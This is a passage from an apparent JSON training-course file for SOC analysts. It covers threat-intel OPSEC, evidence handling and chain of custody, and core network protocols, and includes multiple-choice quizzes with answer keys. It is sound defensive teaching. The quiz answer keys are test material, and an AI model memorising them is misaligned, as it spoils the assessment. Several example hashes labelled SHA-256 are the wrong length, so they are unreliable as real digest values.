      "question": "You receive a phishing email whose link is hxxps://portal-reset[.]com/verify?token=Zx91kQ, unique to the targeted user. You want to know if the domain is malicious. Which action best balances getting useful intel with sound OPSEC?",
      "options": [
        {
          "label": "Paste the full URL including the token into VirusTotal so every engine can scan the exact malicious page the user received.",
          "value": "a"
        },
        {
          "label": "Search the bare domain and its hash in VirusTotal and passive DNS, and check WHOIS for the creation date, without visiting the tokenized URL.",
          "value": "b"
        },
        {
          "label": "Open the link in your normal browser from your workstation to observe exactly what the phishing page asks the victim to do.",
          "value": "c"
        },
        {
          "label": "Forward the email to your personal account so you can safely click the unique link from a network outside the company.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct is (b): querying stored data about the domain and checking registration age gets you intel without touching the attacker's tokenized endpoint, preserving OPSEC. (a) submits the victim-specific token to a service the attacker may monitor, and VT will fetch the URL — tipping them off. (c) detonates hostile content on a corporate endpoint from the corporate IP, both risky and revealing. (d) still accesses the unique URL, alerting the attacker, and moves the threat to an unmanaged environment."
    },
    {
      "question": "A file hash you look up on VirusTotal shows a detection ratio of 0/72, and a domain in the same alert was registered four days ago per WHOIS. How should you interpret these two facts together?",
      "options": [
        {
          "label": "The 0/72 confirms the file is clean, so the recently registered domain is almost certainly a harmless new business site.",
          "value": "a"
        },
        {
          "label": "The zero detections mean the file is merely unknown, and the very recent domain registration is a genuine risk signal worth escalating.",
          "value": "b"
        },
        {
          "label": "Both signals are meaningless because VirusTotal and WHOIS are unreliable and should never influence an analyst's verdict.",
          "value": "c"
        },
        {
          "label": "The domain age is irrelevant since only antivirus detection ratios can determine whether an indicator is truly malicious.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct is (b): a 0/72 ratio means no engine has flagged it yet, which is common for fresh or targeted malware — unknown, not safe — while a four-day-old domain is a classic newly-registered-domain risk indicator, so together they warrant a closer look. (a) misreads 'unknown' as 'clean' and ignores the suspicious domain age. (c) wrongly dismisses two standard, useful enrichment sources. (d) is false — domain age is a well-established signal, and detection ratios are only one input among many."
    },
    {
      "question": "You check an IP address on a single reputation feed and it shows zero reports. What is the correct interpretation, and what should you do next?",
      "options": [
        {
          "label": "The IP is definitely safe, because a feed with zero reports proves no malicious activity has ever occurred from that address.",
          "value": "a"
        },
        {
          "label": "The IP is unknown to that one feed, so cross-reference it against WHOIS, passive DNS, and another reputation feed before concluding anything.",
          "value": "b"
        },
        {
          "label": "The IP must belong to a government agency, because only government-owned addresses are excluded from every reputation feed.",
          "value": "c"
        },
        {
          "label": "The lookup failed technically, so you should re-run the exact same query on the exact same feed until a report finally appears.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct is (b): zero reports on one feed means unreported to that source, not proven clean, so cross-referencing multiple independent sources is the correct next step — the same 'unknown is not safe' logic that applies to VirusTotal. (a) wrongly treats absence of evidence as proof of safety. (c) invents a rule that does not exist. (d) misdiagnoses a normal negative result as a technical failure and repeating the same query changes nothing."
    }
  ],
  "references": [
    "https://docs.virustotal.com/docs/how-it-works",
    "https://www.cisa.gov/news-events/news/understanding-domain-name-system-dns",
    "https://attack.mitre.org/techniques/T1596/"
  ],
  "xp": 205,
  "estimatedMinutes": 42,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-evidence-collection-chain-of-custody",
  "slug": "evidence-collection-chain-of-custody",
  "title": "Evidence Collection and Chain of Custody",
  "topic": "Incident Response",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "When an incident might lead to legal action, insurance claims, or internal discipline, how you handle evidence matters as much as how you stop the attack. Mishandled evidence is worthless in court and can undermine your entire investigation — a technically brilliant analysis can be thrown out entirely over a documentation gap. This lesson assumes no prior forensics background and builds the whole picture from zero: what 'evidence' even means in a digital investigation and why it needs special handling at all, the order of volatility that dictates what you collect first, why pulling power is usually the wrong move, imaging and hashing for integrity, the chain of custody that keeps evidence admissible, and the common mistakes that quietly destroy otherwise-solid cases. By the end you will know not just the theory but the concrete, line-by-line records a SOC analyst actually produces during evidence handling.",
  "sections": [
    {
      "heading": "Start Here: Why Digital Evidence Needs Special Handling",
      "content": "Picture a police officer arriving at a crime scene. Before anyone touches anything, they put up tape, photograph the room exactly as they found it, and log every single item that gets moved, bagged, or examined — who touched it, when, and why. This is not bureaucratic caution for its own sake; it exists because a defence lawyer's entire strategy might be to argue 'you cannot prove this evidence was not planted, altered, or swapped after the fact.' Rigorous handling is what makes evidence *trustworthy enough to act on*, whether that action is a criminal conviction, a lawsuit, an insurance payout, or simply an internal decision to discipline an employee.\n\nA SOC investigation works exactly the same way, just with digital 'items': a hard drive, a memory dump, a log file, a suspicious executable. **Evidence**, in this context, is any data that helps establish what happened during an incident — and it needs the same rigor as a physical crime scene for the same reason: **anyone challenging your conclusions can attack how you got them**, not just what you found.\n\nTwo threats to digital evidence make it uniquely fragile compared to, say, a physical fingerprint:\n\n- **It can vanish.** Some of the most valuable evidence exists only in a running computer's memory and disappears the instant the machine is turned off — unlike a fingerprint, which stays put until someone wipes it.\n- **It can be altered without a trace — unless you specifically prove otherwise.** Copying a file, opening it in the wrong tool, or even just booting an infected machine can silently change data, and there is no visible 'this was tampered with' sign the way a broken lock leaves one. You need mathematical proof of unchanged-ness, which is where hashing (covered shortly) comes in.\n\nBecause of this fragility, digital forensics developed its own disciplined workflow, and this lesson teaches you the four pillars a SOC analyst needs: **collect the most fragile data first** (order of volatility), **prove nothing changed** (imaging and hashing), **document every hand-off** (chain of custody), and **balance stopping the attacker against preserving the scene** (containment vs. preservation). Even if a given incident never sees a courtroom, following this discipline is simply good analysis — it is what lets you, six months later, still trust your own findings."
    },
    {
      "heading": "Order of Volatility: Collect the Fragile First",
      "content": "Digital evidence exists on a spectrum of fragility. Some data vanishes the instant a machine loses power or reboots; other data survives for years. The **order of volatility** is the principle that you collect evidence from the most fleeting sources first, working toward the most durable — because every second you delay, volatile data may be overwritten or lost.\n\nA general order, from most to least volatile:\n\n| Priority | Source | Why it is fragile |\n|---|---|---|\n| 1 | CPU registers, cache | Overwritten in microseconds |\n| 2 | **RAM / memory**, running processes, network connections | Lost on power-off or reboot |\n| 3 | Temporary files, swap/page file | Rotated and overwritten during use |\n| 4 | **Disk** (hard drive / SSD) | Persists across reboots |\n| 5 | Logs on remote servers | Retained per policy, relatively stable |\n| 6 | **Backups**, archives | Designed for long-term retention |\n\nThe headline for a SOC analyst: **memory before disk before backups.** Volatile memory (RAM) is a goldmine — it can hold decryption keys, malware that never wrote itself to disk (**fileless malware**), active network connections, injected code, and clear-text credentials. None of that survives a shutdown.\n\nThis is why the **first instinct to \"just turn it off\"** is often a mistake. Powering down a compromised host to \"stop the bleeding\" destroys everything in RAM — potentially the only evidence of how the attack worked. Where feasible and safe, capture a **memory image** of the live system *before* touching power. The order of volatility is not academic trivia; it dictates the sequence of your very first response actions, and getting the sequence wrong means permanently losing evidence you can never recover."
    },
    {
      "heading": "Imaging and Hashing: Preserving Integrity",
      "content": "Once you decide to collect, the governing rule is: **never investigate on the original.** You work on a copy, so the original evidence stays pristine. Two techniques make this trustworthy.\n\n**Imaging** is creating a **bit-for-bit forensic copy** of a storage source — RAM or a disk. Unlike a normal file copy, a forensic image captures *everything*: allocated files, deleted-but-not-overwritten data, slack space, and file-system metadata. Disk imaging should be done through a **write blocker**, a hardware or software control that permits reading from the source drive while preventing any write back to it — so the mere act of copying cannot alter the original. Memory imaging uses a live acquisition tool because RAM cannot be write-blocked the same way.\n\n**Hashing** is how you *prove* the copy is faithful and stays unchanged. A cryptographic hash function (such as SHA-256) reduces any amount of data to a fixed fingerprint; change a single bit and the fingerprint changes completely. The workflow:\n\n1. Acquire the image.\n2. Compute the hash of the original source and of the image; they must match — proving the copy is exact.\n3. Record that hash value in your documentation.\n4. Any time later, re-hash the evidence; if it still matches, you have **proof it was not altered** since collection.\n\nConcretely, a hash verification record in your notes might look like this:\n\n```\nEvidence: Disk image of WORKSTATION-07 (Dell Latitude, Serial 8HX92Q2)\nImaging tool: forensic imager, write-blocked acquisition\nSHA-256 of source disk:  a94a8fe5ccb19ba61c4c0873d391e987982fbbd3f5b4c2e1a0d9c8b7a6f5e4d\nSHA-256 of image file:   a94a8fe5ccb19ba61c4c0873d391e987982fbbd3f5b4c2e1a0d9c8b7a6f5e4d\nResult: MATCH — image is a verified bit-for-bit copy of the source\n```\n\nBecause the two hashes match exactly, you have mathematical proof the image is identical to the original disk at the moment of collection. Six months later, if you re-hash the stored image file and get that same value again, you have equally strong proof nothing happened to it in storage. This one small habit — compute, record, and later re-verify a hash — is what turns 'trust me, I copied it carefully' into a claim you can actually defend.\n\nThis is the digital equivalent of tamper-evident tape. In court, an opposing expert will ask, \"How do you know this file is what you found and not something you edited?\" Your answer is the matching hash. (MD5 and SHA-1 are still seen in older tooling, but SHA-256 is preferred because MD5/SHA-1 are cryptographically weakened.)\n\nFor a SOC analyst, even when full forensic imaging is handled by a specialist team, you are frequently the one who **hashes a captured file, a memory dump, or a suspicious sample** and logs that value — establishing the integrity baseline everything downstream depends on."
    },
    {
      "heading": "Chain of Custody: Who, What, When, How",
      "content": "Collecting evidence correctly is only half the job. You must also prove, from the moment of collection onward, that the evidence was continuously accounted for and never tampered with. That documented trail is the **chain of custody**.\n\nA chain-of-custody record answers, for every piece of evidence, four questions at each step:\n\n- **Who** handled it (the person's name and role).\n- **What** the evidence is (a precise description — device, serial number, hash value).\n- **When** each transfer or action happened (date and time).\n- **How** it was handled, stored, and transported (e.g., sealed in an anti-static bag, stored in a locked evidence locker).\n\nA real chain-of-custody log entry, filled out the way a SOC/IR team would actually write it, looks like this:\n\n```\nEVIDENCE LOG — Case #IR-2026-0417\n\nItem #1: Dell Latitude laptop, Serial# 8HX92Q2\n  Description: Suspected compromised workstation (user: j.torres)\n  SHA-256 (disk image): a94a8fe5ccb19ba61c4c0873d391e987982fbbd3\n\n  2026-08-16 09:42  Collected by: A. Cohen (SOC L2)\n      Action: Memory image captured; disk imaged via write blocker\n      Location: IR lab, evidence locker #4\n\n  2026-08-16 10:15  Transferred: A. Cohen -> M. Patel (Forensics)\n      Reason: Deep-dive malware analysis\n      Storage while in use: Locked forensics workstation, access-logged\n\n  2026-08-16 16:30  Transferred: M. Patel -> Evidence Locker #4\n      Hash reverified: a94a8fe5ccb19ba61c4c0873d391e987982fbbd3 (MATCH)\n      Storage: Locker #4, sealed, access requires two-person sign-out\n```\n\nNotice what this single log actually proves: every person who ever touched the evidence is named, every location it sat in is recorded, every transfer has a timestamp, and the hash is re-verified at the final storage step to prove nothing changed along the way. If this laptop's evidence is ever challenged in court or in an HR hearing, this log — not your memory of events — is what answers the challenge.\n\nEvery time evidence changes hands or location, both parties sign the log. The result is an **unbroken timeline** from collection to presentation.\n\nWhy this matters so much: for evidence to be **admissible** in a legal proceeding, the party presenting it must show it is authentic and unaltered. A **broken chain of custody** — an unexplained gap in the timeline, evidence left unattended, a missing signature, no hash to prove integrity — lets the opposing side argue the evidence could have been tampered with or swapped. Even technically sound evidence can be thrown out on those grounds, potentially collapsing a case.\n\nPractical habits for a SOC analyst:\n\n- Document **as you go**, not from memory afterward. Contemporaneous notes with timestamps carry far more weight.\n- Record the **hash** in the custody log so integrity and custody are linked.\n- **Minimize handlers** — fewer people in the chain means fewer gaps to explain.\n- Store evidence securely with **restricted access**, and log every access.\n\nEven when a case never reaches court, this rigor makes your findings defensible internally — for HR actions, insurance, or regulators. Good custody discipline is simply good analysis discipline."
    },
    {
      "heading": "Containment vs. Preservation: The Practical Tension",
      "content": "During a live incident, two goals pull against each other. **Containment** wants to stop the attacker *now* — cut their access, halt data theft, prevent spread. **Preservation** wants to keep the scene intact so you can collect evidence and understand what happened. Move too aggressively and you destroy evidence; move too cautiously and the attacker keeps causing damage.\n\nThe most common flashpoint is the impulse to **pull the power (or the network cable) on a compromised host.** Consider the trade-offs:\n\n- **Pulling power** instantly stops on-host activity — but destroys everything in RAM (running malware, network sessions, keys, fileless artifacts) and can corrupt open files. You lose your most volatile, most valuable evidence.\n- **Hard shutdown via the OS** triggers logoff scripts and may let malware run cleanup or anti-forensic routines.\n\nThe generally preferred move for a SOC analyst is **network isolation, not power-off.** Isolating the host — via an EDR \"contain\" or \"quarantine\" action, disabling the switch port, or moving it to a quarantine VLAN — severs the attacker's command-and-control and stops lateral movement, while the machine **stays running** so memory and live state remain available for capture. You get containment *and* preservation.\n\nA sound sequence during a serious incident:\n\n1. **Isolate** the host from the network (contain) while leaving it powered on.\n2. **Capture volatile evidence** — memory image, running processes, network connections — following the order of volatility.\n3. **Image the disk** with a write blocker.\n4. **Hash** everything and record it.\n5. Maintain the **chain of custody** at every step.\n\nThere are exceptions. If a system is actively destroying data (e.g., ransomware mid-encryption) or a life-safety issue exists, immediate shutdown may be the lesser evil — a judgment call that usually belongs to an incident lead, not a first responder acting alone. As a SOC analyst, your job is to know these trade-offs, follow your organization's IR playbook, escalate the decision when stakes are high, and above all resist the reflex to power off before evidence is safe."
    },
    {
      "heading": "Common Mistakes That Break a Case",
      "content": "Even analysts who know the theory in this lesson lose cases through small, avoidable errors made under the pressure of a live incident. Knowing the common failure modes is as important as knowing the correct procedure, because it tells you exactly where to be careful.\n\n- **Running tools on the original instead of a copy.** Scanning a suspect drive with antivirus, or simply opening a suspicious file to 'take a quick look,' can modify timestamps or content — the single most common way analysts accidentally destroy the thing they were trying to preserve. Always work on the image, never the original.\n- **Documenting from memory afterward instead of in real time.** A chain-of-custody entry written the next day, reconstructed from memory, carries far less weight than a contemporaneous note with an exact timestamp. Write it down as it happens.\n- **Too many hands on the evidence.** Every additional person who touches an item is one more link in the chain that can be questioned or that can introduce a gap. Keep the list of handlers as short as operationally possible.\n- **Skipping the hash, or computing it inconsistently.** A chain-of-custody log without a recorded hash value proves custody but not integrity — the two need to travel together, as shown in the worked log entry above.\n- **Storing evidence insecurely, or without logging access.** A laptop left on an unlocked desk 'just for an hour' between steps is an unexplained gap an opposing party can exploit, even if nothing actually happened to it.\n- **Powering off a live system reflexively.** As the previous section explained, this is often the single most damaging mistake in the earliest minutes of an incident, because it destroys volatile evidence that can never be recovered.\n- **Inconsistent timestamps.** Recording some events in local time and others in UTC, without labelling which is which, can make an otherwise solid timeline look contradictory or even impossible under scrutiny.\n\nNone of these mistakes require malice — they are the natural result of working quickly under pressure without a disciplined habit already built. That is exactly why chain-of-custody procedures exist as a checklist rather than as something to improvise in the moment: the whole point is to make the careful behaviour the *default* behaviour, even on your worst, most chaotic incident of the year."
    }
  ],
  "keyTakeaways": [
    "Digital evidence is uniquely fragile — some of it vanishes on power-off and none of it visibly shows tampering — so forensics uses a disciplined workflow: collect fragile data first, prove nothing changed with hashes, document every hand-off, and balance containment against preservation.",
    "Collect evidence in order of volatility — memory before disk before backups — because RAM holds fileless malware, keys, and live connections that vanish on power-off, and prove integrity by working on a hashed, write-blocked forensic image rather than the original.",
    "Prefer network isolation over pulling power so you contain the attacker while preserving volatile evidence, and maintain an unbroken chain of custody (who, what, when, how) with linked hash values, because a documented gap — or a common mistake like scanning the original or documenting from memory — can render even sound evidence inadmissible."
  ],
  "quiz": [
    {
      "question": "A workstation is beaconing to a command-and-control server, and you suspect fileless malware running only in memory. Your instinct is to stop the threat fast. Which first action best balances containment with evidence preservation?",
      "options": [
        {
          "label": "Immediately pull the power cable to halt the malware and prevent it from causing any further damage on the host.",
          "value": "a"
        },
        {
          "label": "Isolate the host from the network via EDR containment while leaving it powered on, then capture a memory image.",
          "value": "b"
        },
        {
          "label": "Perform a normal operating-system shutdown so the machine closes its files cleanly before you begin collecting evidence.",
          "value": "c"
        },
        {
          "label": "Leave the host fully connected and running while you spend an hour writing up a detailed investigation plan first.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct is (b): network isolation severs the C2 channel and stops lateral movement (containment) while the machine stays on, preserving the RAM where fileless malware lives so you can image memory. (a) destroys all volatile evidence — exactly the artifacts you need for fileless malware. (c) keeps the attacker connected during shutdown and may trigger malware cleanup or anti-forensic routines. (d) leaves the attacker actively connected and exfiltrating while you delay containment."
    },
    {
      "question": "In court, opposing counsel claims the disk image you collected three months ago might have been altered since collection. Which practice most directly lets you rebut that claim?",
      "options": [
        {
          "label": "You can re-compute the SHA-256 hash of the image and show it matches the value you recorded and logged at collection time.",
          "value": "a"
        },
        {
          "label": "You explain that you are an experienced analyst and would never alter evidence during any investigation you handle.",
          "value": "b"
        },
        {
          "label": "You point out that the image was stored on an expensive enterprise server with strong general reliability guarantees.",
          "value": "c"
        },
        {
          "label": "You note that antivirus scanned the image and found no malware, proving the file has not changed since collection.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Correct is (a): a cryptographic hash recorded at collection and re-verified later is the standard, mathematical proof that not a single bit changed — the direct rebuttal to a tampering claim. (b) is a personal assurance, which carries no evidentiary weight against a technical challenge. (c) storage reliability says nothing about whether the contents were modified. (d) an antivirus scan detects malware, not alteration — a file can be heavily edited and still be malware-free, so it proves nothing about integrity."
    },
    {
      "question": "During a live investigation, an analyst opens a suspicious file directly from the original evidence drive 'just to take a quick look' before imaging it. What is the primary problem with this action?",
      "options": [
        {
          "label": "There is no problem, because merely opening a file for viewing never changes any data or metadata on a drive.",
          "value": "a"
        },
        {
          "label": "Opening the original can alter timestamps or content, undermining the integrity you need to prove the evidence is unchanged.",
          "value": "b"
        },
        {
          "label": "The problem is purely a productivity one, because imaging always takes less time than opening a single file first.",
          "value": "c"
        },
        {
          "label": "The problem is that antivirus software will automatically delete the file before it can ever be imaged at all.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct is (b): interacting with the original drive can silently change timestamps or content, which is exactly the kind of unexplained alteration that undermines integrity and can be challenged later — always work on an imaged copy first. (a) is false; opening files can and does change access timestamps and metadata. (c) mischaracterises a preservation issue as a mere time-management concern. (d) invents a behaviour antivirus does not perform by default."
    }
  ],
  "references": [
    "https://csrc.nist.gov/pubs/sp/800/86/final",
    "https://www.rfc-editor.org/rfc/rfc3227",
    "https://csrc.nist.gov/pubs/sp/800/61/r2/final"
  ],
  "xp": 205,
  "estimatedMinutes": 42,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-core-protocols-beginners",
  "slug": "core-protocols-every-analyst-should-know",
  "title": "Core Protocols Explained: DNS, DHCP, SSH, SMB, SPF & DKIM",
  "topic": "Networking",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Every action on a network is a conversation, and protocols are the languages those conversations are spoken in. When a laptop joins the office Wi-Fi, opens a website, logs into a server, saves a file to a shared drive, or receives an email, a different protocol is doing the talking behind the scenes. This lesson is a beginner-friendly, plain-language tour of six protocols a SOC analyst meets every single day: DNS, DHCP, SSH, SMB, SPF, and DKIM. For each one you will learn exactly what it does, what its job is, and — most importantly — who does what and when. No prior networking background is assumed; we build every idea from a real-life picture first, and the final section shows how these protocols' logs chain together into one real investigation.",
  "sections": [
    {
      "heading": "What a Protocol Actually Is",
      "content": "A **protocol** is simply an agreed set of rules for how two computers talk to each other. Think of two people on a phone call. Before any real conversation happens, they both follow an unwritten routine: one says \"Hello?\", the other answers, they take turns, they say \"bye\" at the end. If one person spoke Japanese and the other only French, nothing would work. A protocol is that shared routine and shared language, written down precisely so that any two machines — built by different companies, running different software — can still understand each other perfectly.\n\nTwo ideas will come up again and again, so let us pin them down now.\n\n### Client and server\n\nIn most conversations one side asks and the other answers. The side that starts the request is the **client** (your laptop asking for a web page). The side that waits and responds is the **server** (the machine that holds the web page). The same computer can be a client in one conversation and a server in another.\n\n### Ports\n\nA single server can run many services at once — email, web, file sharing — all on the same IP address. So how does an incoming request know which service to reach? Through a **port number**, which works like a labelled door on a building. The building is the computer (its IP address); the doors are the ports. Web traffic knocks on one door (port 443), email on another, file sharing on another. Each protocol in this lesson has its own well-known door number, and memorising those numbers is one of the fastest ways to read network logs fluently.\n\nWhy does an analyst care about protocols at all? Because **every protocol leaves a trail**, and **attackers must use protocols too**. An attacker stealing files still speaks the file-sharing protocol; a phisher still sends email that either passes or fails the email-authentication protocols. When you understand the normal, polite version of each conversation, the abnormal version — the intruder — stands out. The rest of this lesson walks through six of those conversations, one at a time.\n\n| Protocol | Its one-line job | Well-known port |\n|----------|------------------|-----------------|\n| DNS | Turn names into IP addresses | 53 |\n| DHCP | Hand out network settings automatically | 67 / 68 |\n| SSH | Log into a remote machine securely | 22 |\n| SMB | Share files and printers (mainly Windows) | 445 |\n| SPF | Say which servers may send your email | (published in DNS) |\n| DKIM | Cryptographically sign an email | (published in DNS) |"
    },
    {
      "heading": "DNS — The Internet's Phonebook",
      "content": "**DNS** stands for **Domain Name System**, and its job is the simplest to describe: it turns a name you can remember into a number the network can use. Humans like names such as `www.example.com`; computers route traffic using **IP addresses** such as `93.184.216.34`. DNS is the translator between the two. The real-life picture is an old paper phonebook: you know a person's name, you look them up, you get their phone number. DNS is the phonebook of the internet, and it answers on **port 53**.\n\n### What it does\n\nBefore your browser can load a website, it must find out the site's IP address. It asks DNS, \"What is the address for `www.example.com`?\" and DNS answers with an IP. Only then does the actual connection begin. This lookup happens constantly and invisibly — every website, app, and update check triggers DNS first.\n\n### Who does what, and when\n\nSeveral players cooperate, in order:\n\n1. **The client (your device)** asks its configured **DNS resolver** — usually run by your company or your internet provider — \"What is the IP for this name?\" This happens the moment you click a link or an app phones home.\n2. **The resolver** does the legwork. If it does not already know the answer (from a recent lookup it **cached**), it asks a chain of servers: a **root server** points it toward the right **TLD server** (the one responsible for `.com`), which points it to the domain's **authoritative server** (the one that officially holds `example.com`'s records).\n3. **The authoritative server** gives the final answer — the IP address.\n4. **The resolver** hands that IP back to your device and remembers it for a while (the record's **TTL**, or time-to-live) so the next lookup is instant.\n\nThe whole round trip usually takes a few milliseconds. The key mental model: your device asks once, and a resolver quietly walks a chain of directories on your behalf.\n\n### Why the SOC cares\n\nBecause DNS runs before almost every connection, it is a goldmine and a target. Malware must look up its **command-and-control** server's name, so suspicious or newly-registered domains in DNS logs are an early warning. Attackers also abuse DNS to smuggle data out in tiny pieces (**DNS tunnelling**), or generate thousands of random-looking domain names (a **DGA**, domain generation algorithm) to stay reachable. An analyst who watches DNS sees intentions before the payload even lands."
    },
    {
      "heading": "DHCP — The Automatic Address Desk",
      "content": "**DHCP** stands for **Dynamic Host Configuration Protocol**. Its job is to hand a device everything it needs to work on a network the instant it connects — automatically, with no human typing in settings. The real-life picture is a hotel check-in desk: you arrive, the receptionist assigns you a room number, tells you the Wi-Fi password and how to reach the front desk, and gives you the room for a set number of nights. DHCP is that receptionist for computers.\n\n### What it does\n\nWhen a laptop joins a network, it does not yet have an IP address or know how to reach the internet. DHCP gives it four essentials: an **IP address** (its identity on the network), a **subnet mask** (which nearby addresses are local), a **default gateway** (the door out to the rest of the network), and one or more **DNS server** addresses (so it can then do the phonebook lookups from the previous section). All of this is leased for a limited time.\n\n### Who does what, and when\n\nThe exchange happens in four quick steps the moment a device connects, often remembered by the word **DORA**:\n\n1. **Discover** — the new device shouts to the whole local network, \"Is there a DHCP server out there? I need settings.\" It has no address yet, so this is a broadcast.\n2. **Offer** — a **DHCP server** replies, \"Here is an address you can use, plus the gateway and DNS.\"\n3. **Request** — the device says, \"Yes please, I will take that offered address.\"\n4. **Acknowledge** — the server confirms, \"It's yours,\" and records the **lease** (which address went to which device, and for how long).\n\nThe server listens on **port 67** and the client on **port 68**. The lease is temporary; before it expires the device renews it, which is why the same laptop might keep one address for days or get a new one after a long weekend.\n\n### Why the SOC cares\n\nDHCP logs are the map from an **IP address to an actual device** at a moment in time. Alerts usually name an IP, but IPs get reused, so to answer \"which machine was `10.4.2.17` at 2 a.m.?\" you check the DHCP lease records. Analysts also watch for a **rogue DHCP server** — an unauthorised device handing out settings to hijack traffic — and for unexpected devices suddenly requesting leases, which can reveal something new (and unwanted) plugged into the network."
    },
    {
      "heading": "SSH — The Secure Remote Control",
      "content": "**SSH** stands for **Secure Shell**. Its job is to let a person (or a script) log into and control another computer over the network, with the entire conversation encrypted so no eavesdropper can read it. The real-life picture is a secure remote control for a machine sitting somewhere else — a server in a data centre, a cloud host — as if you were typing directly at its keyboard, except everything travelling between you and it is scrambled. SSH listens on **port 22**.\n\n### What it does\n\nAdministrators use SSH every day to manage servers they will never physically touch: running commands, editing configuration, restarting services, copying files. Crucially, SSH replaced older tools like Telnet precisely because Telnet sent everything — including passwords — as plain readable text. SSH encrypts the whole session, so even someone capturing the traffic sees only gibberish.\n\n### Who does what, and when\n\nSSH is a classic client/server conversation:\n\n1. **The client** (the admin's laptop) opens a connection to **the server** on port 22 and says, in effect, \"I want to log in.\"\n2. **The two sides agree on encryption.** Before any password or command is sent, they perform a **handshake** that sets up a shared secret, so everything from here on is encrypted.\n3. **The client proves who it is** in one of two ways. Either with a **password**, or — far more securely — with a **key pair**: the client holds a secret **private key**, the server holds the matching **public key**, and the client proves it owns the private key without ever sending it. Key-based login is the professional standard.\n4. **Once authenticated**, the admin gets a shell and works on the remote machine until they log out.\n\nThis typically happens whenever a human or an automated job needs to administer a remote system — often many times a day in any real environment.\n\n### Why the SOC cares\n\nBecause SSH grants full control of a machine, it is a prime target and a prime tool for attackers. A flood of failed logins on port 22 is a **brute-force** attempt to guess a password. An SSH connection from an unusual source — a workstation that never normally administers servers, or a login from a foreign country at 3 a.m. — can signal a compromised account. Attackers also use SSH to **tunnel** through a foothold and reach deeper systems (**pivoting**). Successful and failed SSH logins are among the highest-value events an analyst reviews."
    },
    {
      "heading": "SMB — The Shared Office Filing Cabinet",
      "content": "**SMB** stands for **Server Message Block**. Its job is to let computers — overwhelmingly Windows computers — share files and printers across a network as if the remote folder were sitting on your own machine. The real-life picture is a shared office filing cabinet: many people, from their own desks, open the same cabinet, read documents, drop new ones in, and send jobs to the shared printer down the hall. SMB is what makes that shared drive appear as just another folder on your machine. It runs on **port 445**.\n\n### What it does\n\nWhen you open a network drive at work, copy a report to a team folder, or print to the office printer, SMB is carrying that traffic. A server offers **shares** (named folders or printers it is willing to expose), and clients connect to them, subject to permissions that decide who may read or write. The address format `server\\share` — a **UNC path** — is the SMB way of naming a shared resource.\n\n### Who does what, and when\n\n1. **A server** (a file server, or even an ordinary Windows PC) advertises one or more **shares** and enforces **permissions** on them.\n2. **A client** connects to the server on port 445 and says, \"I want to access this share.\"\n3. **The server checks the user's permissions** and, if allowed, lets the client browse, open, edit, or save files, and use printers.\n4. This happens continuously in day-to-day office work — every time someone touches a network folder or a shared printer.\n\n### Why the SOC cares\n\nSMB is one of the most heavily abused protocols in serious incidents, because file sharing is also, from an attacker's view, a way to move and spread. Once inside, attackers use SMB for **lateral movement** — copying tools onto other machines and running them (the technique behind tools like PsExec). Ransomware uses SMB to reach and encrypt shared drives across the whole company at once. The infamous **WannaCry** outbreak spread through an SMB vulnerability (**EternalBlue**, MS17-010). For that reason, SMB traffic crossing between network zones, or a single machine suddenly connecting to many others on port 445, is a red flag analysts hunt for."
    },
    {
      "heading": "SPF & DKIM — Proving an Email Is Really From Who It Claims",
      "content": "The last two protocols solve one specific, painful problem: **anyone can put any name in the \"From\" line of an email.** Nothing in basic email stops an attacker from writing `From: ceo@yourcompany.com` on a message they sent themselves. That forgery — **spoofing** — is the engine behind most phishing and **business email compromise (BEC)**. SPF and DKIM are two independent checks that let the receiving mail server ask, \"Is this message really authorised by the domain it claims to come from?\" Both work by publishing information in **DNS** (remember the phonebook), which the receiver looks up.\n\n### SPF — the guest list at the door\n\nSPF stands for **Sender Policy Framework**. A domain owner publishes, in DNS, a list of the mail servers that are **allowed to send email for that domain**. The real-life picture is a guest list at an event: the doorman checks whether the arriving server's address is on the list.\n\n- **Who does what, and when:** the domain owner sets up the SPF list once. Then, every time a message arrives, the **receiving mail server** looks up the sending domain's SPF record and checks whether the server that actually delivered the message is on the approved list. If not, SPF **fails** — a strong sign of forgery.\n- SPF's limit: it validates the sending **server**, not the message contents, and it can break when mail is forwarded.\n\n### DKIM — the tamper-proof wax seal\n\nDKIM stands for **DomainKeys Identified Mail**. When a message leaves the real sender, the sending server adds a **digital signature** calculated from the message using a secret **private key**. The matching **public key** is published in DNS. The real-life picture is a wax seal on a letter: it proves both who sealed it and that no one opened and altered it in transit.\n\n- **Who does what, and when:** the sending server **signs** each outgoing message as it leaves. The **receiving server** fetches the sender's public key from DNS and verifies the signature. If it matches, two things are proven: the message genuinely comes from that domain, and it was **not modified** on the way. If someone tampered with it, the seal breaks and DKIM fails.\n\n### How they fit together (and DMARC)\n\nSPF and DKIM are complementary: SPF checks *where the mail came from*, DKIM checks *that the message is authentic and unaltered*. A third policy, **DMARC**, ties them together — it tells receivers what to do when the checks fail (nothing, quarantine to spam, or reject outright) and requires the authenticated domain to **align** with the visible \"From\" address, closing gaps the other two leave open.\n\n### Why the SOC cares\n\nWhen you triage a suspicious email, the message **headers** record the SPF, DKIM, and DMARC results. An email claiming to be from your CEO that shows `spf=fail` and `dkim=fail` is very likely spoofed. Reading these three results is one of the first, fastest moves in phishing investigation."
    },
    {
      "heading": "Worked Example: Chaining Protocol Logs to Solve a Real Incident",
